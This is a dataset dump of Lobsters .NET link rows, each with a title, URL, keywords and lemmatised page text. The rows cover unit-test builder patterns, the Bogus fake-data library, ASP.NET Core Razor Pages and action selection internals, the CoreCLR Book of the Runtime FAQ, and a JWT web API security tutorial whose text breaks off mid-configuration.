350,Lobsters,dotnet,"C#, F#, .NET programming","Concurrent Revisions: Programming Model for Concurrent, Parallel, and Distributed Apps",https://www.microsoft.com/en-us/research/project/concurrent-revisions/?from=http%3A%2F%2Fresearch.microsoft.com%2Fen-us%2Fprojects%2Frevisions%2F,concurrent revision programming model concurrent parallel distributed apps,webpage channel interview powerpoint slide oopsla paper parallel incremental esop paper eventual consistency,revision project introduces novel programming model concurrent parallel distributed application provides programmer simple yet powerful efficient mechanism based mutable snapshot deterministic conflict resolution execute various application task parallel even task access data may exhibit readwrite writewrite conflict find basic idea work read oopsla paper link publication read sample webpage run instantly browser watch channel interview check powerpoint slide read semantics paper esop paper better extended version available techreport since started project taken revision model beyond parallel programming following paper describe new application concurrent revision oopsla paper describes use revision unifying parallel incremental computation distinguished paper award esop paper describes use revision distributed system guarantee eventual consistency
351,Lobsters,dotnet,"C#, F#, .NET programming",2 Simple Ways To Improve Your Unit Tests,http://jackhiston.com/2017/10/3/2-simple-ways-to-improve-your-unit-tests/,simple way improve unit test,arrange act assert repeat builder builder pattern aspnet core mvc github repository fluent interface syntax fixture fixture summary autofixture xunit test pattern,past year testing become cornerstone software development turn software development true profession need create robust secure safe efficient system simplest tool toolbox start u road unit test like accountant unit test fantastic way u perform doubleentry bookkeeping unit test double check work correct make sure keep morphing something want however unit test without proper maintenance care become unwieldly must take great care unit test much source code article go two simple refactorings help improve unit test builder fixture two technique make unit test maintainable le brittle source code change designing unit test like use famous arrange act assert method people use technique may know arrange phase balloon size complex unit test arrange phase unit test builder fixture pattern try reduce simplifying unit test encouraging repeat principle nb example shown using c xunit however idea applied objectoriented language builder builder pattern reduce arrange phase considerably let take example piece code public class razorprojectpageroutemodelprovider ipageroutemodelprovider private readonly razorproject project private readonly razorpagesoptions pagesoptions private readonly ilogger logger public razorprojectpageroutemodelprovider razorproject razorproject ioptions razorpagesoptions pagesoptionsaccessor iloggerfactory loggerfactory project razorproject pagesoptions pagesoptionsaccessorvalue logger loggerfactorycreatelogger razorprojectpageroutemodelprovider excerpt aspnet core mvc github repository show class three dependency razorproject ioptions ilogger want unit test class need arrange fact public void onprovidersexecutingreturnspageswithpagedirective arrange var fileprovider new testfileprovider var fileprovideraddfile pageshomecshtml page var fileprovideraddfile pagestestcshtml hello world var fileprovideradddirectorycontent page new ifileinfo fileprovideradddirectorycontent new var project new testrazorproject fileprovider var optionsmanager new testoptionsmanager razorpagesoptions optionsmanagervaluerootdirectory var provider new razorprojectpageroutemodelprovider project optionsmanager nullloggerfactoryinstance var context new pageroutemodelprovidercontext act assert example test aspnet core repository test provider class predicted arrange phase biggest part unit test improve code one part code arrangement testrazorproject class make code readable introduce testrazorprojectbuilder public class testrazorprojectbuilder private readonly testfileprovider fileprovider new testfileprovider private readonly list ifileinfo file new list ifileinfo public testrazorprojectbuilder addfile string path string name var file thisfileprovideraddfile path name thisfilesadd file return public testrazorproject build var thisfileprovideradddirectorycontent page thisfilestoarray fileprovideradddirectorycontent new return new testrazorproject thisfileprovider public static implicit operator testrazorproject testrazorprojectbuilder builder builderbuild done taken code directly unit test moved encapsulation two important point make builder class firstly addfile method using fluent interface syntax mean returning current instance builder call method builder chained secondly implicit cast testrazorproject object two point allow u refactor unit test following note implicit cast fact public void onprovidersexecutingreturnspageswithpagedirective arrange testrazorproject project new testrazorprojectbuilder addfile pageshomecshtml page addfile pagestestcshtml hello world var optionsmanager new testoptionsmanager razorpagesoptions optionsmanagervaluerootdirectory var provider new razorprojectpageroutemodelprovider project optionsmanager nullloggerfactoryinstance var context new pageroutemodelprovidercontext act assert arrange code line massive jump hope see lot readable code inside builder reusable could extend builder allow create custom directory hierarchy builder pattern starting point reducing arrange phase fixture help unit test become even succinct fixture fixture class creates system test example system test razorprojectpageroutemodelprovider example fixture provider could public class razorprojectpageroutemodelproviderfixture private readonly testrazorprojectbuilder projectbuilder new testrazorprojectbuilder private readonly testoptionsmanager razorpagesoptions optionsmanager new testoptionsmanager razorpagesoptions public razorprojectpageroutemodelproviderfixture thisoptionsmanagervaluerootdirectory public razorprojectpageroutemodelproviderfixture setrootdirectory string root thisoptionsmanagervaluerootdirectory root return public razorprojectpageroutemodelproviderfixture addfile string path string file thisprojectbuilderaddfile path file return public razorprojectpageroutemodelprovider createsut return new razorprojectpageroutemodelprovider thisprojectbuilderbuild thisoptionsmanager nullloggerfactoryinstance similar way builder pattern providing fluent interface order allow chaining method call fixture construction providing sensible default also allow setting method call fixture final unit test look like fact public void onprovidersexecutingreturnspageswithpagedirective arrange var sut new razorprojectpageroutemodelproviderfixture addfile pageshomecshtml page addfile pagestestcshtml hello world createsut var context new pageroutemodelprovidercontext act assert arrange phase simple succinct lead code reuse unit test easier maintenance overhead important benefit fixture class change instantiate system test unit test using fixture fixture change easier modifying unit test due adding dependency system test summary learned article application builder fixture pattern builder pattern allows u make unit test easier read help instantiating complex auxiliary class fixture pattern allows u encapsulate way create system test therefore reduces overhead change source code occur tool make life even easier arrange phase popular tool encourage investigate may write blog post future autofixture autofixture provides way remove arrange phase completely helpful way refactoring unit test recommend reading xunit test pattern indepth look refactor unit test make robust maintainable hope help
353,Lobsters,dotnet,"C#, F#, .NET programming",How to Create Bogus Data in C#,http://jackhiston.com/2017/10/1/how-to-create-bogus-data-in-c/,create bogus data c,bogus bogus brian chavez generating blog data summary,programmer lazy love tool automate life automate data timeconsuming necessary part programmer job seeding data database demonstration load performance styling testing need way generate data rudimentary way hand spending day sometimes week inputting data system represents realistic golive scenario begin realise hand inefficient decide create seeding application one fundamental problem seeding general problem computer science general generating random data spend time understanding randomize date generate lorem ipsum text create default image realise building seeding application taking long time realise seeding must problem many programmer face search internet quest make easier find bogus bogus quote brian chavez provides aptly describes bogus bogus simple sane fake data generator net language like c f vbnet bogus help create seeding application bogus sort annoyance randomising data allows generate class bogus based fakerjs another framework help generate massive amount fake data nodejs browser bogus provides many default type data expect simple data type c covered datetime bool int etc bogus also provides api situational example bogus apis allow generate data commerce scenario product name category name pricing generating blog data blogging website us entity framework entity framework create entity entity represent table within database interaction point inserting data following example show entity used website blog post public class blogpost public int id get set public string title get set public string content get set public string metadescription get set public string keywords get set public bool isactive get set public datetime created get set public string authorid get set public applicationuser author get set public list tag get set public blogpost tag new list entity entity framework plain old clr object poco simple object logic code inheritance class tell bogus rule order generate sample blog post var testblogposts new faker blogpost rulefor bp bpid f findexfaker rulefor bp bpcontent f floremparagraphs rulefor bp bpcreated f fdatepast rulefor bp bpisactive f fpickrandomparam new bool true true false rulefor bp bpmetadescription f floremsentences rulefor bp bpkeywords f stringjoin floremwords rulefor bp bptitle f floremsentence rulefor bp bptags f fakeblogposttagsgenerate tolist finishwith f bp consolewriteline blog post created id bpid first line used main feature bogus framework faker faker used generate fake object see define multiple rule generating blog post rule syntax us fluent interface fluent interface way chain method call configuration classically used within builder design pattern first rule defines id blog post currnet index faker generate blog post index incremented second rule show lorem ipsum generation specify want word sentence paragraph also describe many want generate great want create demonstration data showcasing another interesting rule last rulefor bp bptags f fakeblogposttagsgenerate tolist using another faker object generate tag blog post rest faker var faketags new faker tag rulefor tid f findexfaker rulefor tdescription f floremword var fakeblogposttags new faker blogposttag rulefor ttag f faketagsgenerate demonstrates faker chained faker way generate data use faker faker fake data fake data also create custom logic postgeneration shown example writing console every generation blog post final piece puzzle actually generate blog post new faker class finally configured call generate var blogpost testblogpostsgenerate consolewriteline jsonconvertserializeobject blogpost formattingindented serialise object json write console id title quo nulla eius expedita velit omnis laboriosam adipisci ut content quis hic suscipit omnis vero necessitatibus ea et qui ut temporibus consequatur est dolor nemo cum laboriosam sint accusamus cupiditate nisi et alias est aut voluptasnnesse provident quo soluta delectus cumque temporibus ut asperiores architecto atque iusto dictum voluptatem animi iusto dolorem quia consectetur est nihil doloribus voluptatem omnis voluptas labore dolorennnihil quia quaerat explicabo delectus illum id necessitatibus sit occaecati quibusdam voluptates dictum repudiandae ab cum quas quia molestias tempora et non aliquam eum ut et sint maxime blanditiis voluptas aut optio eum metadescription modi et magni eos dictum impedit iurenincidunt quidem asperioresnsunt aut quia sint keywords eveniet laboriosam rerum isactive true created authorid null author null tag blogpostid blogpost null tagid tag id description reprehenderit blogposts null blogpostid blogpost null tagid tag id description dictum blogposts null blogpostid blogpost null tagid tag id description unde blogposts null approximately line code created blog post data generator true power bogus generate method also accepts number create list blog post time var blogposts testblogpostsgenerate create lazily evaluated data ienumerable ienumerable blogpost blogposts testblogpostsgeneratelazy logic foreach var blogpost blogposts limitation seeding application hard part done simple task add entity framework dbcontext saving var blogpost blogpostfakergenerate using var context new applicationcontext contextadd blogpost var key await contextsaveasync summary seeding necessary evil every day job bogus becomes slightly easier whether wantings populate ecommerce site blog even something nothing website performance analysis bogus available net standard nuget package mean use bogus virtually flavour net could use xamarin generate data mobile desktop application require gigabyte data importantly create one seeding generator data share throughout entire application suite fluent interface world random data bogus mandatory tool programmer thanks reading hope help bogus api available readme
355,Lobsters,dotnet,"C#, F#, .NET programming",The Book of the Runtime,https://github.com/dotnet/coreclr/blob/master/Documentation/botr/botr-faq.md,book runtime,book runtime botr faq botr book runtime certain perspective main audience botr botr chapter different design doc new dev familiar feature yet contribute responsibility botr reviewer nt time work botr chapter seems like always thing,book runtime botr faq botr book runtime set document describe component clr bcl intended focus architecture invariant annotated description codebase originally created within microsoft including document developer responsible document feature area helped new devs joining team also helped share product architecture across team realized botr even valuable coreclr open source github publishing botr chapter help new set clr developer botr document written certain perspective term timeframe author think right mutate document make remain doc modulo spelling correction conversion markdown said accept pr doc improve main audience botr developer working bug impinge area need high level overview component developer working new feature dependency component need know enough ensure new feature interact correctly existing component new developer need chapter maintain given component botr chapter purpose book runtime chapter capture information easily reconstruct functional specification source code alone enable communication high level team member explains concept present topdown description mostly importantly explains made design decision made different design doc design doc write start implementation botr chapter usually written feature implemented point already decided pro con various design option settled one perhaps plan use improved design future much better idea detail could hard think without actually going implementationtesting talk rationale behind design decision lot better new dev familiar feature yet contribute new dev great contributor botr one important purpose botr help new devs getting speed way contribute reviewer think thing clear could explained better hesitate contact author chapter chat himher see make understandable getting speed area look botr chapter area see error anything requires update make modification volunteer write chapter part chapter might seem like daunting task start accumulating knowledge take note learn stuff area gradually mold botr chapter responsibility botr reviewer reviewer expected give constructive comment chapter reviewing comment aspect eg technical depth writing style content coverage keep mind botr mostly design architectural issue may obvious meant walk implementation detail please focus really nt time work botr chapter seems like always thing way think would useful working botr spread work nt make workitem need spend next monday thursday work chapter think like something want take break coding bug fixing change scenery find much easier spend little time working chapter specifically allocate contiguous number day always seem hard come someone else write chapter chapter joking actually good way help new devs ramp mentoring new dev area spend time explain feature area encourage write botr chapter one nt already exist course reviewer use documentation already msdn doc blog post net feature certainly base botr chapter well
356,Lobsters,dotnet,"C#, F#, .NET programming",Book of the Runtime,https://github.com/dotnet/coreclr/blob/master/Documentation/botr/README.md,book runtime,join github today sign,dismiss join github today github home million developer working together host review code manage project build software together sign
357,Lobsters,dotnet,"C#, F#, .NET programming",Learning F#: Case study with branch and bound,https://www.youtube.com/watch?v=UZIqQMDZTwc,learning f case study branch bound,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature learning f case study branch bound youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature learning f case study branch bound youtube
358,Lobsters,dotnet,"C#, F#, .NET programming",ASP.NET Core 2.0: Razor Pages,http://jackhiston.com/2017/9/24/aspnet-core-20-repository-overview-razor-pages/,aspnet core razor page,previously series aspnet core mvc repository overview model binding aspnet mvc core repository overview value provider aspnet core repository overview action discovery aspnet core repository overview action selection content introduction aspnet core github repository previous article razor page razor page setup razor page aspnet hosting github repository webhostbuilderextensions usestartup creating first razor page mvcrazorpagesmvcbuilderextensions razorpagesoptions razorprojectpageroutemodelprovider razor page form codebehind file pagemodel bindpropertyattribute razor page application model defaultpageapplicationmodelprovider bindinginfo createhandlermodel nonhandlerattribute first rule dealing multiple handler pageactioninvoker defaultpagehandlermethodselector keep simple stupid kiss getting rid handler query parameter pagedirectivefeature defaultpagehandlermethodselector seofriendly url summary,previously series aspnet core mvc repository overview model binding aspnet mvc core repository overview value provider aspnet core repository overview action discovery aspnet core repository overview action selection content introduction article fifth series dedicating reviewing code design aspnet core github repository series try explain underlying mechanism aspnet core code fit together create framework know published date article discus razor page within aspnet core previous article discussed specific action selected given set action descriptor found start article explains use razor page fit existing ecosystem razor page many feature given u latest aspnet core release part release brand new feature razor page razor page advertised useful pagefocused scenario little real logic needed example page page content neither dynamic based conditional logic contact page detail simple form filled user razor page consists backend code file paired view c razor code familiar classic aspnet web form razor page give feeling vu razor page feel like aspnet web form modern approach razor page access many existing mechanism aspnet core repository access existing feature possible due razor page mvc sharing code implementation mechanism razor engine writing c code within view identical original method used mvc allows use tag helper view component razor engine offer razor page mvc used together routing us process action discovery mvc described previous article series razor page razor page us notion handler handler similar action mvc controller handler razor page action controller inserted collection selecting handler run performed route considered setup razor page setting application use mvc two step process aspnet core framework two startup method called reflection configureservices configure method method used setup application dependency injection system middleware pipeline respectively public void configureservices iservicecollection service servicesaddmvc public void configure iapplicationbuilder app appusemvc conscious effort aspnet core team make easy use razor page mvc together therefore start using razor page add nothing startup process already using classic mvc please stand thought section going riddled complication would like know startup method executed refer aspnet hosting github repository specifically webhostbuilderextensions file call usestartup creating first razor page razor page designed simple razor page used simple page within mostly static website example simple page page page iconic content used company invididuals describe audience many detail entity come motivation detail might interesting intended audience however static content prime realestate razor page create first page need provide place store razor page default stored page root application directory changed providing startup configuration service addmvc withrazorpagesroot myrazorpages change razor page engine search razor page myrazorpages folder enable use custom root directory application may already use default page folder also allowing customisation root directory allows two application share razor page example two website may exist umbrella corporation section could identical content extension method withrazorpagesroot declared mvcrazorpagesmvcbuilderextensions class class house common extension customise razor page work reading code class see customising root directory achieved different way service configure option optionsrootdirectory myrazorpages code skip middleman show razor page work directly modifying razor page option shed light root directory value used stored static global configuration class razorpagesoptions mean option available entire dependency injection system class within aspnet core framework code good example use case root directory setting within razorprojectpageroutemodelprovider class class primary purpose provide route model razor page found root directory reading class code becomes apparent need provide page code first directive skip file start underscore itemfilenamestartswith page like viewimports routable continue mean razor page prefixed something like aboutme would good name second directive code show also need file cshtml file marked page top pagedirectivefeaturetrygetpagedirective logger item var routetemplate cshtml page without page razorpages continue rule mind end razor page file similar page p simple razor page p content would need placed file called aboutmecshtml root directory default page aboutmecshtml file place nothing else need aspnet core framework explore page root directory find file route page using page name therefore access brand new aboutmecshtml file url navigate aboutme path favourite web browser said previously razor page designed simple straightforward example need even codebehind file logic one file able create routable content provides purpose razor page form sometimes page need static content typical page contact page good example interaction end user generally need collect user detail message user would like give view typical contact u razor page page model myapplicationpagescontactusmodel form method post div aspvalidationsummary div div label aspfor name label div input aspfor name span aspvalidationfor name span div div div label aspfor message label div input aspfor message span aspvalidationfor message span div div div button type submit save button div form contact u page see declared necessary page directive named file without underscore prefix cshtml extension prerequisite file classed razor page file also placed root directory razor page default page codebehind file provide value contact u page need code handle posting form data public class contactusmodel pagemodel bindproperty public string name get set bindproperty public string message get set public async task iactionresult onpostasync modelstateisvalid return page return redirecttopage index shown codebehind file razor page flexible enough allow declared inline razor view preference separate file clarity define function area like page model contactusmodel function public class contactusmodel pagemodel generally prefere separate file make clear intended purpose file code behind file inherits pagemodel class class provides many helper method property help handler method declared page model inheritance mandatory draw similar concept inheriting controller class coding classic mvc two property defined file name message attribute declared called bindpropertyattribute attribute attribute implementation imodelnameprovider interface allows u specify name metadata request binding property name bindpropertyattribute also implement irequestpredicateprovider interface allows implementation custom code narrow property actually bound case bindpropertyattribute allows binding get request private static bool isnongetrequest actioncontext context return stringequals contexthttpcontextrequestmethod get stringcomparisonordinalignorecase overridable bindproperty supportsget true public string name get set razor page application model general theme throughout article razor page fit snugly framework implementation classic mvc discussed previously series application model built order provide routable data defaultpageapplicationmodelprovider class take model razor page reflection extract binding metadata binding metadata provided handy bind property attribute controller metadata extracted using bindinginfo class razor page different using bindinginfo class application model provider extract property metadata defined razor page model controller action metadata extracted mvc application model provider handler specific razor page request done similar fashion defaultpageapplicationmodelprovider class populate handler method application model handler method page application model provider retrieve method page model var method pagemodelhandlertypegetmethods var methodslength var handler createhandlermodel method handler null pagemodelhandlermethodsadd handler using code understand method deemed handler regard razor page remember handler similar action seen example onpostasync method page model method handler type looped handler model created successful handler method added page model mean create number method page model could deemed handler handler model successfully created createhandlermodel method createhandlermodel method first check whether method candidate handler ishandler method return null become handler method need pas following criterion static abstract constructor generic public method nonhandlerattribute attribute method signature grab method onpostasync following declaration public async task iactionresult onpostasync let u go rule make sure candidate becoming handler method static abstract constructor generic supplied generic parameter public method declared nonhandlerattribute therefore pas first hurdle createhandlermodel method next step createhandlermodel method try parse handler name http method used tryparsehandlermethod methodname var httpmethod var handlername return null system parse handler method name added handler handler name need specific format accepted handler first rule method name need start handler method name always start methodnamestartswith methodnamelength length return false method onpostasync pass test code following par rest method name find http method chosen specific handler name use without going code much valid name form onget onpost onpostasync ongettestasync etc key http method handler name optional async suffix completely irrelevant ignored http method excluded handler method considered http request handler name specified route data need match value exclude name http method handler considered valid handler method take example onpostasync method successful handler candidate name start defines http method post ignored async suffix perfect view html form dealing multiple handler defined handler added page application model however nothing stopping u multiple handler per razor page wanted two form page wanted provide sort ajax handler specific razor page defining multiple handler easy create two different method following name convention outlined however define form submit button corresponds handler use asppagehandler tag helper achieve form method post input type submit asppagehandler test value go index form match handler named onposttest public iactionresult onposttest return redirecttopage index redirect index page asppagehandler tag helper evaluate following input element input type submit value go index formaction http jackhistoncomabout handlertest key query string added formaction attribute selecting handler invoke pageactioninvoker class use defaultpagehandlermethodselector class choose appropriate handler selects potential candidate taking action descriptor current context checking see handler method important check happen select best candidate firstly handler specified http method name need match current request handlerhttpmethod null stringequals handlerhttpmethod contexthttpcontextrequestmethod stringcomparisonordinalignorecase continue pass next check handler name handler name specified eg onpostasync handler candidate regardless current value handler name http request otherwise name need match else handlername null handlernameequals handlername stringcomparisonordinalignorecase continue given check let example http web request arrives handler name dostuff http method post possible handler name considered onpost post request handler name specified onpostasync async alternative previous name ondostuff http method handle anything handler route value equal dostuff ondostuffasync async alternative previous name onpostdostuff http method post handle anything handler route value equal dostuff onpostdostuffasync async alternative previous name page model defined would get ambiguous handler exception perform extra step assign score handler specific handler higher score assigned private static int getscore handlermethoddescriptor descriptor descriptorname null return else descriptorhttpmethod null return else return action name automatically seen best candidate specify name specifies http method le specific still defines something current http request context finally neither name method given least specific type handler name nb getting scenario impossible handler need either name http method neither provided example onasync would classed handler measured handler score highest score win taking previous possible handler score onpost onpostasync ondostuff ondostuffasync onpostdostuff onpostdostuffasync framework know handler ondostuff ondostuffasync onpostdostuff onpostdostuffasync choose considered equal handler route value dostuff ambiguous exception would thrown solution reduce number handler specific razor page directive new feature anyway keep simple stupid kiss getting rid handler query parameter razor page allows define route parameter within page directive razor page page handler job pagedirectivefeature static class extract value handler route parameter preserved name handler route value example contact u page located root directory pagescontactuscshtml placed handler name routing create handler routed without query string given ondostuff handler contact u page model corresponding url path would become contactusondostuff rather contactus handlerondostuff work defaultpagehandlermethodselector class checking handler name query string route data var handlername converttostring contextroutedatavalues handler stringisnullorempty handlername contexthttpcontextrequestquerytrygetvalue handler stringvalues queryvalues handlername queryvalues without create nice seofriendly url came different handler multiple handler per razor page resembles controller view system albeit simpler version point summary razor page seen mvc little brother younger brother learns older brother ultimately different goal life goal far simpler one closely resembles structure web application razor page stretched point look like controllerview relationship intended purpose strive razor page simple serve one purpose mvc razor page share ecosystem using time possible even encouraged popular methodology taking traction start using razor page actual page eg contact u term condition etc controller api level control ajax singlepage application backends etc define line use razor page like anything software requires gut feeling rule thumb following define web page simple http get request could probably define simple razor page thank reading hope help journey razor page
359,Lobsters,dotnet,"C#, F#, .NET programming",The Little ASP.NET Core Book,https://www.recaffeinate.co/post/introducing-little-aspnetcore-book/,little aspnet core book,little aspnet core book free aspnet core book page write free book go forth learn little aspnet core book github creative common attribution,today excited release side project last month little aspnet core book free book short introduction aspnet core web framework never built apps c aspnet even book teach basic building modern fast web application using aspnet core get free copy book page write free book always wanted write publish technical book made plan last year write book aspnet core life wonderfully got way form wedding honeymoon new job release date aspnet core approached wanted create something give back community help folk learn awesome web framework time write full page technical monster decided write short introductory book instead go forth learn little aspnet core book born single caffeinefueled weekend followed many short burst editing hope help learn something new book life github licensed creative common attribution license always please share feedback critique
360,Lobsters,dotnet,"C#, F#, .NET programming",ASP.NET Core 2.0 - Repository Overview: Action Selection,http://jackhiston.com/2017/9/9/aspnet-core-20-repository-overview-action-selection/,aspnet core repository overview action selection,previously series aspnet core mvc repository overview model binding aspnet mvc core repository overview value provider aspnet core repository overview action discovery content introduction aspnet core github repository previous article actionselector class actionselector registered global dependency injection system iactionselector mvcattributeroutehandler mvcroutehandler previous article dependency iactiondescriptorcollectionprovider route value cache actionselector code comment conventional routing actionselector selectcandidates action descriptor note cache efficiency cache attribute routing mvcattributeroutehandler selectcandidates attributeroute actionselector iactiondescriptorcollectionprovider attribute routing route template microsoft documentation selecting best candidate selectbestcandidate actionselector evaluating constraint selectbestcandidate action constraint iactionconstraint interface source code ambiguousactionexception summary,previously series aspnet core mvc repository overview model binding aspnet mvc core repository overview value provider aspnet core repository overview action discovery content introduction article fourth series dedicating reviewing code design aspnet core github repository series try explain underlying mechanism aspnet core code fit together create framework know published date article discus action selection within aspnet core previous article discussed action controller discovered within application article focus specific action selected given set action descriptor found start also try discus brand new razor page fit process action selection mvc razor page actionselector class summary default see cref iactionselector implementation summary public class actionselector iactionselector summary defines interface selecting mvc action invoke current request summary public interface iactionselector ireadonlylist actiondescriptor selectcandidates routecontext context actiondescriptor selectbestcandidate routecontext context ireadonlylist actiondescriptor candidate actionselector class central piece infrastructure aspnet core action selection actionselector class registered global dependency injection system iactionselector abstraction like registration aspnet core dependency injection system added previous registration servicestryaddsingleton iactionselector actionselector mean easily create implementation iactionselector provide logic selecting action descriptor public class customactionselector iactionselector public ireadonlylist actiondescriptor selectcandidates routecontext context actiondescriptor selectbestcandidate routecontext context ireadonlylist actiondescriptor candidate startup configuration servicesaddsingleton iactionselector customactionselector iactionselector abstraction used mvcattributeroutehandler mvcroutehandler main registered irouter implementation selecting action run action selector care whether controller razor page action metadata described action descriptor would like learn creation action descriptor see previous article action descriptor collection populated dependency public actionselector iactiondescriptorcollectionprovider actiondescriptorcollectionprovider actionconstraintcache actionconstraintcache iloggerfactory loggerfactory actionselector class multiple dependency iactiondescriptorcollectionprovider doubt important dependency provides action descriptor currently registered within system action constraint cache used retrieve constraint specific actioneg httppost route value cache route value value given specific route key given action example action default following route keyvalue pair controller home action index home index controller action name respectively actionselector class take action descriptor provided action descriptor collection provider creates internal cache mapping route key route value action selector class looping action given extracting routevalues action conventionally routed action need extract route value associated action order store dictionary var routevalues new string routekeyslength var j j routekeyslength j actionroutevaluestrygetvalue routekeys j routevalues j every action descriptor route value every route key defined within system route key specified particular action filled null particular action example action may area attribute specifies routekey area use value blog area blog public void index return view due declaration route value system assign null every action descriptor route key area assigning null value route key necessary scenario razor page razor page add page route value current context action route value match action page set seen explained code comment going back caching mechanism cache key used array route value action actual entry list action descriptor matched value example given action public class homecontroller controller public void index return view route key value action controller home action index cache store keyvalue pair following key new string home index value new list actiondescriptor action conventional routing actionselector class provides way retrieve action based conventional routing selectcandidates method signature actionselector class following ireadonlylist actiondescriptor selectcandidates routecontext context method retrieves read list action descriptor one action descriptor describes particular action within current application based conventional routing using provided route data passed routecontext action selector loop registered route key given cacheie action controller area etc var key cacheroutekeys var value new string keyslength var keyslength contextroutedatavaluestrygetvalue key object value value null value value string converttostring value try retrieve actual value matching route key routedata given routecontext loop try receive value associated key value null assigns value array value array used key entry calculated cache cacheordinalentriestrygetvalue value var matchingroutevalues cacheordinalignorecaseentriestrygetvalue value matchingroutevalues return matchingroutevalues ordinal entry built actual route value defined conventional routing within application matching route value found ready actually select action selected candidate note cache efficiency cache action selector us done clever way previously discussed speed actual selection action candidate us actual route value key beneficial perspective incoming request route data however actual cache us two dictionary one need build two map route value ordinalentries new dictionary stringarraycomparerordinal ordinalignorecaseentries new dictionary stringarraycomparerordinalignorecase one dictionary casesensitive keyvalue lookup caseinensitive two come speed using dictionary casesensitive key faster caseinsensitive key code utilising fact however action selection actually caseinsensitive two action actually equal one index another index particular route value essentially match found casesensitive match first caseinsensitive match used shown earlier attribute routing mvcattributeroutehandler handler attribute routing use selectcandidates method retrieve action descriptor attribute routing us attributeroute class retrieve applicable action descriptor attributeroute class like actionselector class us iactiondescriptorcollectionprovider retrieve action descriptor system var attributeroutedactions actionswhere aattributerouteinfo template null attributeroute class concerned action attribute route information contrast actionselector class concerned action attribute routingie conventional routing attribute routing route template route template either builtin custom part url path example may url path similar blog site us get translated selecting specific action public class blogcontroller controller route year int month int day int title name blogpostdetails public iactionresult get int year int month int day string title route attribute defined route template route template made four different route parameter year month day title match action url path need route parameter provided also say year month day integer year int month int day int section colon signifies inline constraint part first path separator integer action match url route parameter learn route template microsoft documentation selecting best candidate public actiondescriptor selectbestcandidate routecontext context ireadonlylist candidate selectbestcandidate method called mvcattributeroutehandler class mvcroutehandler class handle matching action http request attribute routing conventional routing respectively handler used routing system order handle incoming http request use actionselector class achieve goal selectbestcandidate method accepts read list action descriptor either sourced action selector attribute routing system following code core method var match evaluateactionconstraints context candidate var finalmatches selectbestactions match evaluating constraint selectbestcandidate method point time action constraint evaluated selection best candidate action evaluated based action constraint action constraint used narrow selection action currently multiple candidate match given route value define action constraint implementing iactionconstraint interface public interface iactionconstraint iactionconstraintmetadata int order get bool accept actionconstraintcontext context two piece functionality implement one order property accept method order property defines stage action constraint evaluated action constraint lower order evaluated first nb two action match request one action constraint deemed specific match selected action action constraint explained actual iactionconstraint interface source code constraint evaluated result checked one matching action infamous ambiguousactionexception thrown summary action selection know nothing controller know nothing application deal list action descriptor action descriptor already evaluated start post went action descriptor selected based incoming request discussed extension point selection process also discussed attribute routing conventional routing share common code differ sourcing global action descriptor thank reading hope help please share friend
361,Lobsters,dotnet,"C#, F#, .NET programming",Secure a Web Api in ASP.NET Core,http://www.blinkingcaret.com/2017/09/06/secure-web-api-in-asp-net-core/,secure web api aspnet core,aspnet core identity scratch external login provider aspnet core facebook authentiation aspnet core demo project github using token instead cookie jwt jwt claim using jwt aspnet core create jwt token symmetric key claim email protected jwt rfc issuer email protected unix time creating endpoint get token aspnet identity core scratch validating token signing user external login provider aspnet core client httpinterceptors,resource find teach secure aspnet core web application written example aspnet core identity scratch external login provider aspnet core facebook authentiation aspnet core web apis using aspnet core little bit harder find information blog post blog post explain use json web token jwt secure web api aspnet core demo project github use follow along using token instead cookie common way keep track signed user web application use cooky normal flow user click login go login page entering valid credential response sent user browser contains setcookie header contains encrypted information every time cookie set domain eg blinkingcaretcom every subsequent request domain browser include cookie automatically server cookie decrypted content used create user identity process work well client browser different story client mobile app jwt use instead cookie token token also represents user use rely browser builtin mechanism deal cooky explicitly ask token store somewhere manually send every request way make painless possible discus later post token format talking jwt jwt stand json web token jwt token following format example header alg typ jwt payload contains list claim example name rui admin true finally signature created taking header payload cryptographically signing using algorithm specified header example signing part involves using secret known server real jwt look like important aware information contained jwt encrypted get payload need even developer tool console example chrome use atob method pas payload argument see get json back signature guarantee someone try replace payload token becomes invalid someone successful replacing payload producing valid token would need know secret used signature secret never go client something mind decide put payload using jwt aspnet core use jwt aspnet core need know manually create jwt token validate create endpoint client app request create jwt token first need install package systemidentitymodeltokensjwt dotnet add package systemidentitymodeltokensjwt need create secret key going use symmetric key var secretkey new symmetricsecuritykey secret need least character long token contain set claim let create var claim new claim new claim claimtypesname john new claim jwtregisteredclaimnamesemail email protected used claimtypes systemsecurityclaims jwtregisteredclaimnames systemidentitymodeltokensjwt highlight jwtregisteredclaimnames contains claim listed jwt rfc use much possible planning use produced token different framework compatibility reason however claim type enable certain functionality aspnet example claimtypesname default claim type user name useridentityname another example claimtypesrole checked use role property authorize attribute eg authorize role administrator creating list claim want encode token create token var token new jwtsecuritytoken issuer app audience client app claim claim notbefore datetimenow expires datetimenowadddays signingcredentials new signingcredentials key concept mention namely issuer audience expiration date issuer represents entity generates token case aspnet core web application audience token intended ie client application issuer audience important relying third party create token case validate issuer audience validate token notbefore expires define point time token used valid respectively finally signingcredentials specify security key algorithm use create signature example used care issuer audience optional jwt specification use simpler constructor overload jwtsecuritytoken expects jwtsecurityheader jwtsecuritypayload manually add expires notbefore claim payload example var claim new claim new claim claimtypesname john new claim jwtregisteredclaimnamesemail email protected new claim jwtregisteredclaimnamesexp new datetimeoffset datetimenowadddays tounixtimeseconds new claim jwtregisteredclaimnamesnbf new datetimeoffset datetimenow tounixtimeseconds var token new jwtsecuritytoken new jwtheader new signingcredentials key new jwtpayload claim note exp expires nbf notbefore claim value string unix time easiest way convert datetime format using datetimeoffset creating instance jwtsecuritytoken way actually generate token call writetoken method instance jwtsecuritytokenhandler pas jwtsecuritytoken parameter string jwttoken new jwtsecuritytokenhandler writetoken token creating endpoint get token know create jwt token need way enable client get easiest way create web api controller action expects post request example would work public class tokencontroller controller route token httppost public iactionresult create string username string password isvaliduserandpasswordcombination username password return new objectresult generatetoken username return badrequest isvaliduserandpasswordcombination use example aspnet identity validate user credential need resource setup aspnet identity check aspnet identity core scratch generatetoken process described previous section validating token signing user way issue token need way validate using aspnet core authentication middleware configure accept jwt token add microsoftaspnetcoreauthenticationjwtbearer nuget package project dotnet add package microsoftaspnetcoreauthenticationjwtbearer next open startupcs update configureservices method public void configureservices iservicecollection service servicesaddauthentication option optionsdefaultauthenticatescheme jwtbearer optionsdefaultchallengescheme jwtbearer addjwtbearer jwtbearer jwtbeareroptions jwtbeareroptionstokenvalidationparameters new 